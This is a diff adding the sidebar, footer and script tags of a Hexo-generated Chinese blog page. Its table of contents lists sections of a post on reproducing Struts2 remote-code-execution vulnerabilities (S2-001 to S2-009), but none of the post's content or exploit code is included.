+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#struts2%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">struts2介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E7%82%B9"><span class="nav-number">1.0.1.</span> <span class="nav-text">特点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-number">1.0.2.</span> <span class="nav-text">工作原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#struts2%E6%8B%A6%E6%88%AA%E5%99%A8"><span class="nav-number">1.0.3.</span> <span class="nav-text">struts2拦截器</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Struts2%E6%A1%86%E6%9E%B6%E8%AF%86%E5%88%AB"><span class="nav-number">2.</span> <span class="nav-text">Struts2框架识别</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">Struts2漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81S2-001%EF%BC%88OGNL-%E5%BE%AA%E7%8E%AF%E8%A7%A3%E6%9E%90%E5%AF%BC%E8%87%B4%E7%9A%84-RCE-%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="nav-number">3.1.</span> <span class="nav-text">1、S2-001（OGNL 循环解析导致的 RCE 漏洞）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">3.1.0.0.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.1.0.0.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#POC"><span class="nav-number">3.1.0.0.3.</span> <span class="nav-text">POC:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#EXP"><span class="nav-number">3.1.0.0.4.</span> <span class="nav-text">EXP:</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81S2-005%EF%BC%88S2-003-%E7%9A%84%E7%BB%95%E8%BF%87%EF%BC%89"><span class="nav-number">3.2.</span> <span class="nav-text">2、S2-005（S2-003 的绕过）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">3.2.0.0.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="nav-number">3.2.0.0.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="nav-number">3.2.0.0.3.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#POC-1"><span class="nav-number">3.2.0.0.4.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#EXP-1"><span class="nav-number">3.2.0.0.5.</span> <span class="nav-text">EXP</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81S2-007%EF%BC%88%E9%AA%8C%E8%AF%81%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E9%94%99%E8%AF%AF%E6%97%B6%EF%BC%8C%E4%BC%9A%E5%AF%BC%E8%87%B4%E4%BA%8C%E6%AC%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%A7%A3%E6%9E%90%EF%BC%89"><span class="nav-number">3.3.</span> <span class="nav-text">3、S2-007（验证类型转换错误时，会导致二次表达式解析）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="nav-number">3.3.0.0.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-2"><span class="nav-number">3.3.0.0.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-2"><span class="nav-number">3.3.0.0.3.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#POC-2"><span class="nav-number">3.3.0.0.4.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#EXP-2"><span class="nav-number">3.3.0.0.5.</span> <span class="nav-text">EXP</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81S2-009-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2011-3923"><span class="nav-number">3.4.</span> <span class="nav-text">4、S2-009 远程代码执行漏洞 (CVE-2011-3923)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="nav-number">3.4.0.0.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-3"><span class="nav-number">3.4.0.0.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-3"><span class="nav-number">3.4.0.0.3.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#EXP-3"><span class="nav-number">3.4.0.0.4.</span> <span class="nav-text">EXP</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">参考：</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Markcheng"
+      src="/images/head.jpg">
+  <p class="site-author-name" itemprop="name">Markcheng</p>
+  <div class="site-description" itemprop="description">去爱 去工作</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
+    Chat
+  </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zcwww6" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zcwww6" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1311839468@qq.com" title="E-Mail → mailto:1311839468@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">greyArea</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
